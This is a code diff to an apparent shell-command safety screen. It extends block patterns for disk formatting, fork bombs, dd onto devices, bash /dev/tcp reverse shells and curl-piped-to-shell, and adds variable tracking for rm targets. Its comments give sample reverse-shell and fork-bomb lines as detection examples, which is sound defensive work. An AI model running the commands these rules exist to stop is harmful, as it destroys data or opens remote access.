@@ -19,16 +19,22 @@ from contextlib import contextmanager
 from contextvars import ContextVar
 from dataclasses import dataclass, field
 from functools import cache, lru_cache
+from urllib.parse import urlsplit
 
 #: (name, regex) pairs matched against the raw command line and every simple command.
 HARDLINE_PATTERNS: list[tuple[str, str]] = [
     # rm -rf / and ~ are caught by _rm_check (token based: any flag spelling, quotes, sudo/env wrappers)
     # env / printenv dumping the environment are caught by _env_dump_check (token based: it lets `env VAR=x cmd`,
     # `env -u X cmd` and `env -i cmd` fall through to the real command's checks, which a raw regex could not)
-    ("mkfs", r"\bmkfs(?:\.\w+)?\b"),  # mkfs / mkfs.ext4 ...
+    ("mkfs", r"\b(?:mkfs(?:\.\w+)?|mke2fs|mke3fs|mkdosfs|mkntfs|mkreiserfs)\b"),  # mkfs / mkfs.ext4 / mke2fs ...
     ("dd-to-device", r"\bdd\b.*\bof=/dev/"),  # dd of=/dev/...
     # a function that pipes itself into itself in the background, however it is named (`:(){ :|:& }`, `f(){ f|f& }`)
-    ("fork-bomb", r"(?:\b(\w+)\s*\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}|:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\})"),
+    (
+        "fork-bomb",
+        r"(?:\b(\w+)\s*\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}"
+        r"|\bfunction\s+(\w+)\s*(?:\(\))?\s*\{\s*\2\s*\|\s*\2\s*&\s*\}"
+        r"|:\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\})",
+    ),
     # bash's network redirects: the usual reverse shell (`bash -i >& /dev/tcp/HOST/PORT 0>&1`)
     ("dev-tcp", r"[<>]&?\s*/dev/(?:tcp|udp)/"),
     ("pipe-to-shell", r"\bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash)\b"),  # curl ... | sh
@@ -1265,10 +1271,24 @@ def _xargs_runs_input_as_code(words: list[str]) -> bool:
     words = _strip_wrappers(words)
     if not words or os.path.basename(words[0]) != "xargs":
         return False
+    placeholders = {"{}"}  # what xargs swaps for each input item: {} with -I{} / -i, or the word -I names
     for i, w in enumerate(words[1:], 1):
+        if w == "-I" and i + 1 < len(words):
+            placeholders.add(words[i + 1])
+        elif w.startswith("-I") and len(w) > 2:
+            placeholders.add(w[2:])
+        elif w.startswith("--replace="):
+            placeholders.add(w.partition("=")[2])
         if _is_interpreter(os.path.basename(w)):
             tail = words[i + 1 :]
-            return any(a.startswith("-") and not a.startswith("--") and a.endswith("c") for a in tail[-1:])
+            flag = next(
+                (j for j, a in enumerate(tail) if a.startswith("-") and not a.startswith("--") and a.endswith("c")),
+                None,
+            )
+            if flag is None:
+                return False
+            script = tail[flag + 1] if flag + 1 < len(tail) else None
+            return script is None or script in placeholders  # no script of its own: the input is the program
     return False
 
 
@@ -1584,6 +1604,8 @@ class _Where:
     dirs: tuple[str | None, ...]
     overflow: bool
     here: str | None
+    #: the variables the line had set to literals at that sub: a substitution runs there, not at the end of the line
+    known: tuple[tuple[str, tuple[str, ...]], ...] = ()
 
 
 class _Dirs:
@@ -1628,19 +1650,19 @@ class _Dirs:
         self.known: dict[str, tuple[str, ...]] = {}  # variables the line set to a literal (see _note_vars)
 
     def where(self) -> _Where:
-        return _Where(tuple(self.all), self.overflow, self.here)
+        return _Where(tuple(self.all), self.overflow, self.here, tuple(self.known.items()))
 
     def spawn(self, wheres: list[_Where]) -> _Dirs:
         """A model for a command nested in the subs taken at ``wheres`` (a payload, a heredoc script): it starts in
         every directory they may run in."""
         if not wheres:
-            wheres = [_Where(tuple(self.all), self.overflow, None)]
+            wheres = [_Where(tuple(self.all), self.overflow, None, tuple(self.known.items()))]
         start = list(dict.fromkeys(d for w in wheres for d in w.dirs))
         heres = {w.here for w in wheres}
         here = heres.pop() if len(heres) == 1 else None
         overflow = any(w.overflow for w in wheres)
         child = _Dirs(start, here, self.home, self.cdpath, overflow=overflow)
-        child.known = dict(self.known)
+        child.known = _merge_known([dict(w.known) for w in wheres])
         return child
 
     def _add(self, d: str) -> None:
@@ -1855,8 +1877,24 @@ _DISK_TOOLS: dict[str, frozenset[str]] = {
     "sgdisk": frozenset({"-p", "--print", "-l", "--load-backup", "-E", "--end-of-largest", "-v", "--verify"}),
 }
 _PARTED_WRITES = frozenset({"mklabel", "mktable", "mkpart", "mkpartfs", "rm", "resizepart", "resize", "move", "name"})
-#: ``>``, ``>>``, ``>|``, ``<>``, ``&>``, ``2>`` and ``>&`` (an output redirect, as a lone word or glued to its target).
-_OUT_REDIRECT = re.compile(r"^(?:\d*|&)(?:>>?\|?|<>|>&)")
+#: ``>``, ``>>``, ``>|``, ``<>``, ``&>``, ``2>``, ``>&``: an output redirect, wherever in a word it sits (``cat x>f``).
+_OUT_REDIRECT = re.compile(r"&>>?|\d*>>?\|?|<>|>&")
+
+
+def _out_redirect_targets(words: list[str]) -> list[str]:
+    """The words the output redirects of a simple command write to: what follows the operator in its word
+    (``>/dev/sda``, ``x>/dev/sda``) or, when the operator ends the word, the next word."""
+    out: list[str] = []
+    for i, w in enumerate(words):
+        for m in _OUT_REDIRECT.finditer(w):
+            tail = w[m.end() :]
+            if tail:
+                out.append(tail)
+            elif m.end() == len(w) and i + 1 < len(words):
+                out.append(words[i + 1])
+    return out
+
+
 #: Programs whose operands are written to: every operand (``tee``, ``truncate``) or the last (``cp``, ``mv``).
 _WRITES_ALL = frozenset({"tee", "truncate", "sponge"})
 _WRITES_LAST = frozenset({"cp", "mv", "install"})
@@ -1865,11 +1903,7 @@ _WRITES_LAST = frozenset({"cp", "mv", "install"})
 def _block_device_check(argv: list[str], words: list[str]) -> str | None:
     """Output redirected onto a disk, or a program that wipes, relabels or copies onto one. ``words`` are the simple
     command's words with the redirections still in (``argv`` is its normalised program and arguments)."""
-    for i, w in enumerate(words):
-        m = _OUT_REDIRECT.match(w)
-        if not m:
-            continue
-        target = w[m.end() :] or (words[i + 1] if i + 1 < len(words) else "")
+    for target in _out_redirect_targets(words):
         if _BLOCK_DEVICE.match(target):
             return "block-device-write"
     if not argv:
@@ -1925,17 +1959,25 @@ def _download_targets(argv: list[str], words: list[str]) -> list[str]:
     out: list[str] = []
     letter = {"curl": "o", "wget": "O"}.get(name, "")
     args = argv[1:]
+    named = remote_name = False
     for i, a in enumerate(args):
         if a.startswith("--"):
             key, eq, value = a.partition("=")
             if key in ("--output", "--output-document"):
+                named = True
                 out.append(value if eq else (args[i + 1] if i + 1 < len(args) else ""))
+            elif key in ("--remote-name", "--remote-name-all"):
+                remote_name = True
         elif letter and a.startswith("-") and len(a) > 1 and a.endswith(letter) and i + 1 < len(args):
+            named = True
             out.append(args[i + 1])
-    for i, w in enumerate(words):
-        m = _OUT_REDIRECT.match(w)
-        if m:
-            out.append(w[m.end() :] or (words[i + 1] if i + 1 < len(words) else ""))
+        elif name == "curl" and a.startswith("-") and len(a) > 1 and a.endswith("O"):
+            remote_name = True  # -O, -LO, -fsSLO: saved under the url's file name
+    if not named and (remote_name or name == "wget"):  # wget always saves under it; curl only with -O
+        for a in args:
+            if "://" in a and not a.startswith("-"):
+                out.append(urlsplit(a).path.rstrip("/").rsplit("/", 1)[-1] or "index.html")
+    out += _out_redirect_targets(words)
     return [t for t in out if t and t != "-" and not t.startswith("&")]
 
 
@@ -1971,21 +2013,54 @@ _WHOLE_VAR = re.compile(r"^\$\{?(\w+)\}?(/.*)?$")
 _KNOWN_VALUE = re.compile(r"^(?:[^$`]*|\$\{?(?:HOME|PWD)\}?(?:/.*)?)$")
 
 
+#: ``${X:-default}`` / ``${X-default}``: X's value, or the default when X is unset (or empty).
+_DEFAULTED_VAR = re.compile(r"^\$\{(\w+):?-([^}]*)\}(/.*)?$")
+#: Commands that may set any variable in ways this does not follow (the input they read, the code they run): after
+#: one, no variable of the line is known.
+_VAR_WRITERS = frozenset({"read", "mapfile", "readarray", "eval", "let", "unset", "source", ".", "getopts"})
+
+
+def _merge_known(snapshots: list[dict[str, tuple[str, ...]]]) -> dict[str, tuple[str, ...]]:
+    """What the line may have set at any of several points (a substitution that came from more than one sub): a
+    variable holds every value any of them gave it."""
+    merged: dict[str, tuple[str, ...]] = {}
+    for snap in snapshots:
+        for name, values in snap.items():
+            merged[name] = tuple(dict.fromkeys((*merged.get(name, ()), *values)))
+    return merged
+
+
 def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[str]) -> None:
     """Record what the simple command ``tokens`` assigns, so a later delete of ``$X`` is read as what it holds:
-    ``X=/``, ``export X=/``, ``for X in a b``. A value the shell computes (``X=$(..)``, ``for X in *``) is forgotten."""
+    ``X=/``, ``Y=$X`` (a copy of a known one), ``export X=/``, ``for X in a b``. A value the shell computes
+    (``X=$(..)``, ``for X in *``) is forgotten, and so is everything once a command runs that may set any variable
+    (``read X``, ``eval``, ``printf -v``, ``declare -n``, ``source``)."""
     words = _past_reserved(tokens)
     while words and words[0] in ("time", "-p"):  # `time X=/` still sets X
         words = words[1:]
+    name0 = os.path.basename(argv[0]) if argv else ""
+    flags = [a for a in argv[1:] if a.startswith("-")]
+    if (
+        name0 in _VAR_WRITERS
+        or (words and os.path.basename(words[0]) in _VAR_WRITERS)  # `eval` is unwrapped out of argv
+        or (name0 == "printf" and "-v" in argv)
+        or (name0 in ("declare", "typeset", "local") and any("n" in f for f in flags if not f.startswith("--")))
+    ):
+        known.clear()
+        return
+    for w in words:
+        if m := re.match(r"^(\w+)\+=", w):  # `X+=more` changes X to something this does not follow
+            known.pop(m.group(1), None)
     assigns: list[str] = []
     if words and all(_is_assignment(w) for w in words):
         assigns = words
-    elif argv[:1] and argv[0] in ("export", "declare", "typeset", "local", "readonly"):
+    elif name0 in ("export", "declare", "typeset", "local", "readonly"):
         assigns = [w for w in argv[1:] if _is_assignment(w)]
     for w in assigns:
         name, _, value = w.partition("=")
-        if _KNOWN_VALUE.match(value):
-            known[name] = (value,)
+        values = _resolve_target(value, known)
+        if all(_KNOWN_VALUE.match(v) for v in values):
+            known[name] = tuple(values)
         else:
             known.pop(name, None)
     if tokens[:1] == ["for"] and len(tokens) > 3 and tokens[2] == "in" and tokens[1].isidentifier():
@@ -1997,16 +2072,23 @@ def _note_vars(known: dict[str, tuple[str, ...]], tokens: list[str], argv: list[
 
 
 def _resolve_target(t: str, known: dict[str, tuple[str, ...]]) -> list[str]:
-    """``t`` with a variable it starts with replaced by every value it may hold; unchanged when it is not known."""
+    """``t`` with a variable it starts with replaced by every value it may hold: the known ones, and for
+    ``${X:-default}`` the default as well (X may be unset); unchanged when it is not known."""
+    if m := _DEFAULTED_VAR.match(t):
+        rest = m.group(3) or ""
+        return [m.group(2) + rest, *(v + rest for v in known.get(m.group(1), ()))]
     m = _WHOLE_VAR.match(t)
     if m and m.group(1) in known:
         return [value + (m.group(2) or "") for value in known[m.group(1)]]
     return [t]
 
 
-#: A whole word that is one variable other than $HOME / $PWD, or a command substitution: any path.
-_BARE_EXPANSION = re.compile(r"^(?:\$\{?(?!(?:HOME|PWD)\b)\w+\}?|\$\(.*|`.*)$")
-_SECRET_VAR = re.compile(r"(?i)KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL")
+#: A whole word that is one expansion other than $HOME / $PWD (``$X``, ``${X}``, ``${A[0]}``) or a command
+#: substitution, alone or followed by ``/`` or ``/*``: whatever it holds, and the root if it holds nothing.
+_BARE_EXPANSION = re.compile(r"^(?:\$\{(?!(?:HOME|PWD)\})[^}]*\}|\$(?!(?:HOME|PWD)\b)\w+|\$\(.*|`.*)(?:/\*?)?$")
+#: A variable named for a credential, by whole words of its name (``GITHUB_TOKEN``, ``AWS_SECRET_ACCESS_KEY``), not by
+#: a substring (``MONKEY``, ``TOKENIZER``).
+_SECRET_VAR = re.compile(r"(?i)(?:^|_)(?:API_?KEYS?|KEYS?|SECRETS?|TOKENS?|PASSWORD|PASSWD|CREDENTIALS?)(?:_|$)")
 _VAR_REF = re.compile(r"\$(?:\{(\w+)[^}]*\}|(\w+))")
 _ENV_READ = re.compile(r"environ|process\.env|\bENV\b|getenv")
 _INTERPRETER_CODE_FLAG = re.compile(r"^-[A-Za-z]*[ceEpr]$")
@@ -2066,7 +2148,11 @@ def _human_sub(argv: list[str], known: dict[str, tuple[str, ...]]) -> str | None
 
 
 def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | None:
-    for sub in parsed.subs:
+    need = {k for ks in parsed.child_subs for k in ks}
+    at: dict[int, dict[str, tuple[str, ...]]] = {}  # the variables at each sub a child came from
+    for k, sub in enumerate(parsed.subs):
+        if k in need:
+            at[k] = dict(known)
         tokens = _tokens(sub)
         argv = _command_argv(tokens)
         spelled = _resolve_echo(sub)  # `rm -rf $(echo build)` deletes `build`: read the line as it runs
@@ -2074,8 +2160,9 @@ def _human_parsed(parsed: Parsed, known: dict[str, tuple[str, ...]]) -> str | No
         if hit:
             return hit
         _note_vars(known, tokens, argv)
-    for child in parsed.children:
-        hit = _human_parsed(child, dict(known))
+    for child, ks in zip(parsed.children, parsed.child_subs, strict=True):
+        seen = [at[k] for k in ks if k in at]  # a substitution runs where it sits, not where the line ends
+        hit = _human_parsed(child, _merge_known(seen) if seen else dict(known))
         if hit:
             return hit
     return None
